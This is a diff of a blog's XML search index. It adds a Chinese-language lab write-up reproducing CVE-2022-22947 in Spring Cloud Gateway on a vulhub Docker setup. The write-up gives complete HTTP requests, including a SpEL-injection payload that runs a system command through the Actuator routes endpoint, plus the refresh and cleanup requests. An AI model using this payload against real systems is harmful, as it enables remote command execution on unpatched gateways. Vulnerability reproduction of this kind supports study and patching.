@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE-2022-22947)</title>
+      <link href="/2022/05/07/Spring-Cloud-Gateway/"/>
+      <url>/2022/05/07/Spring-Cloud-Gateway/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行"><a href="#Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行" class="headerlink" title="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行"></a>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Cloud Gateway 3.1.x - 3.1.1</p><p>Spring Cloud Gateway 3.0.x - 3.0.7</p><p>旧的、不受支持的版本也会受到影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22947docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507140704246.png" alt="image-20220507140704246"></p><p>构造恶意伪造数据包</p><pre><code>POST /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329&#123;  &quot;id&quot;: &quot;hacktest&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141227943.png" alt="image-20220507141227943"></p><p>用刚添加的路由发送如下数据包，此数据包会触发表达式执行</p><pre><code>POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141839633.png" alt="image-20220507141839633"></p><p>构造数据包查看结果</p><pre><code>GET /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 2</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141932420.png" alt="image-20220507141932420"></p><p>结束后删除路由</p><pre><code>DELETE /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142054696.png" alt="image-20220507142054696"></p><p>最后在刷新</p><pre><code>POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142147356.png" alt="image-20220507142147356"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</title>
       <link href="/2022/05/07/Spring-Data-Commons/"/>
       <url>/2022/05/07/Spring-Data-Commons/</url>
@@ -2046,9 +2081,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 漏洞 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> sql注入 </tag>
             
